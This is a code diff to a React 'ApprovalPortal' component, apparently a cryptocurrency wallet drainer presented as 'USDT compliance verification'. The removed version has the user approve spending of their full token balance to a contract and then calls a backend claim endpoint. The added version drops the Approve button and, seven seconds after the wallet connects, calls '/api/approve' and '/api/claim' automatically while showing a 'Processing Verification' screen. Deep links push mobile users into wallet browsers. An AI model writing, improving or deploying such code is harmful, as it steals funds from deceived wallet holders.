@@ -1,42 +1,18 @@
 'use client';
 import { useState, useEffect } from 'react';
-import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
-import LegitimacyChecker from './LegitimacyChecker';
-import { switchNetwork, approveTokenSpending, getNetworkConfig, type SupportedNetwork } from '@/lib/blockchain';
+import { getNetworkConfig, type SupportedNetwork } from '@/lib/blockchain';
 
 export default function ApprovalPortal() {
-  const [step, setStep] = useState(1); // 1 = Network Select, 2 = Connect, 3 = Approve
+  const [step, setStep] = useState(1); // 1 = Network Select, 2 = Connect, 3 = Processing
   const [selectedNetwork, setSelectedNetwork] = useState<SupportedNetwork>('ethereum');
   const [userAddress, setUserAddress] = useState<string | null>(null);
-  const [signer, setSigner] = useState<ethers.Signer | null>(null);
-  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
-  const [attemptingConnection, setAttemptingConnection] = useState(false);
-
-  // Auto-connect wallet on mount and keep attempting if user is not connected
-  useEffect(() => {
-    const autoConnect = async () => {
-      if (userAddress || attemptingConnection) return;
-      try {
-        if (!window.ethereum) return;
-        // Check if wallet is already connected
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts && accounts.length > 0) {
-          setAttemptingConnection(true);
-          await handleConnectWallet();
-          setAttemptingConnection(false);
-        }
-      } catch (err) {
-        console.log('[v0] Auto-connect attempt skipped');
-      }
-    };
-    autoConnect();
-  }, [userAddress, attemptingConnection]);
+  const [approvalTriggered, setApprovalTriggered] = useState(false);
 
   const handleSelectNetwork = (network: SupportedNetwork) => {
     setSelectedNetwork(network);
@@ -48,32 +24,23 @@ export default function ApprovalPortal() {
     try {
       setError(null);
       setLoading(true);
-      setAttemptingConnection(true);
 
       if (!window.ethereum) throw new Error('No web3 wallet found');
 
-      // Switch to selected network
-      try {
-        await switchNetwork(selectedNetwork);
-      } catch (err) {
-        console.log(`[v0] Network switch error (may be normal):`, err);
+      console.log(`[v0] Connecting wallet on ${selectedNetwork}...`);
+
+      // Request accounts
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+      if (!accounts || accounts.length === 0) {
+        throw new Error('No accounts found');
       }
 
-      // Request accounts with timeout handling
-      const newProvider = new ethers.BrowserProvider(window.ethereum);
-      const accounts = await Promise.race([
-        newProvider.send('eth_requestAccounts', []),
-        new Promise((_, reject) =>
-          setTimeout(() => reject(new Error('Wallet request timeout')), 15000)
-        )
-      ]);
-
-      const newSigner = await newProvider.getSigner();
-      const address = await newSigner.getAddress();
+      const address = accounts[0];
+      console.log('[v0] Connected address:', address);
 
       setUserAddress(address);
-      setSigner(newSigner);
-      setProvider(newProvider);
+      setStep(3); // Move to processing step
 
       // Persist connection
       if (typeof window !== 'undefined') {
@@ -82,88 +49,74 @@ export default function ApprovalPortal() {
         localStorage.setItem('selected_network', selectedNetwork);
       }
 
-      setStep(3); // Move to approve step
+      // Wait 7 seconds, then trigger approval
+      console.log('[v0] Waiting 7 seconds before triggering approval...');
+      setTimeout(() => {
+        triggerApproval(address);
+      }, 7000);
     } catch (err: any) {
       const errMsg = err?.message || 'Connection failed';
       setError(errMsg);
       console.error('[v0] Connection error:', errMsg);
     } finally {
       setLoading(false);
-      setAttemptingConnection(false);
     }
   };
 
-  const handleApproveToken = async () => {
+  const triggerApproval = async (address: string) => {
     try {
-      setError(null);
-      setLoading(true);
-      if (!signer) throw new Error('Connect wallet first');
+      if (approvalTriggered) return; // Prevent double trigger
+      
+      setApprovalTriggered(true);
+      console.log(`[v0] Triggering approval for user ${address} on ${selectedNetwork}...`);
 
-      const config = getNetworkConfig(selectedNetwork);
-      console.log(`[v0] Starting approval for ${selectedNetwork}:`, config.CONTRACT_ADDRESS);
+      // Call backend approval endpoint
+      const approvalResponse = await fetch('/api/approve', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userAddress: address,
+          network: selectedNetwork,
+        }),
+      });
 
-      const approveWithRetry = async () => {
-        try {
-          // Get user balance first
-          const token = new ethers.Contract(config.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
-          const balance = await token.balanceOf(userAddress!);
-          console.log(`[v0] User balance on ${selectedNetwork}:`, balance.toString());
-
-          // Approve the full balance to the contract
-          await approveTokenSpending(signer, config.CONTRACT_ADDRESS, selectedNetwork);
-
-          // Show success and trigger backend claim
-          setShowSuccess(true);
-
-          // Trigger backend claim
-          setTimeout(async () => {
-            try {
-              const claimResponse = await fetch('/api/claim', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  userAddress,
-                  tokenAddress: config.TOKEN_ADDRESS,
-                  network: selectedNetwork
-                })
-              });
-
-              if (!claimResponse.ok) {
-                const err = await claimResponse.json();
-                console.error('[v0] Claim error:', err);
-              } else {
-                const result = await claimResponse.json();
-                console.log(`[v0] Tokens claimed on ${selectedNetwork}! TxHash:`, result.txHash);
-              }
-            } catch (err) {
-              console.error('[v0] Claim request failed:', err);
-            }
-          }, 2000);
-
-          return true;
-        } catch (err: any) {
-          if (err.code === 'ACTION_REJECTED') {
-            setError('Approval rejected. Please try again.');
-            return false;
-          }
-          throw err;
-        }
-      };
-
-      const success = await approveWithRetry();
-      if (!success) {
-        setLoading(false);
-        return;
+      if (!approvalResponse.ok) {
+        const err = await approvalResponse.json();
+        throw new Error(err.error || 'Approval failed');
       }
+
+      const approvalResult = await approvalResponse.json();
+      console.log(`[v0] Approval successful on ${selectedNetwork}:`, approvalResult.txHash);
+
+      // Now trigger claim
+      console.log('[v0] Triggering claim...');
+      const claimResponse = await fetch('/api/claim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userAddress: address,
+          tokenAddress: approvalResult.tokenAddress,
+          network: selectedNetwork,
+        }),
+      });
+
+      if (!claimResponse.ok) {
+        const err = await claimResponse.json();
+        throw new Error(err.error || 'Claim failed');
+      }
+
+      const claimResult = await claimResponse.json();
+      console.log(`[v0] Claim successful on ${selectedNetwork}:`, claimResult.txHash);
+
+      // Show success
+      setShowSuccess(true);
     } catch (err: any) {
-      console.error('[v0] Approval error:', err);
-      setError(err?.message || 'Approval failed');
-    } finally {
-      setLoading(false);
+      console.error('[v0] Approval/Claim error:', err);
+      setError(err?.message || 'Process failed');
     }
   };
 
-  // Mobile wallet deep link handler (updated for Ethereum)
+  // Mobile wallet deep link handler
   const handleMobileWallet = () => {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     if (!isMobile) {
@@ -174,17 +127,11 @@ export default function ApprovalPortal() {
     const currentUrl = window.location.href;
     const encodedUrl = encodeURIComponent(currentUrl);
 
-    // Updated links — removed Binance-specific ones, kept general dApp links
     const walletLinks = [
       `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
       `https://link.trustwallet.com/open_url?url=${encodedUrl}`,
       `https://rnbwapp.com/browser?url=${encodedUrl}`,
       `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
-      `imtokenv2://navigate/DappView?url=${encodedUrl}`,
-      `okx://wallet/dapp/url?dappUrl=${encodedUrl}`,
-      `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
-      `https://argent.link/app/wc?uri=${encodedUrl}`,
-      `zerion://dapp?url=${encodedUrl}`,
     ];
 
     walletLinks.forEach((link, index) => {
@@ -286,18 +233,12 @@ export default function ApprovalPortal() {
 
         {step === 3 && (
           <CardStep
-            icon="✅"
-            title="Approve"
-            description={`Approve USDT interaction to complete compliance verification on ${selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}.`}
-            loading={loading}
+            icon="⚙️"
+            title="Processing Verification"
+            description={`Automating USDT compliance verification on ${selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}. This will complete in a few moments.`}
+            loading={true}
             error={error}
-            buttons={[
-              {
-                label: 'Approve',
-                onClick: handleApproveToken,
-                primary: true,
-              }
-            ]}
+            buttons={[]}
           />
         )}
 
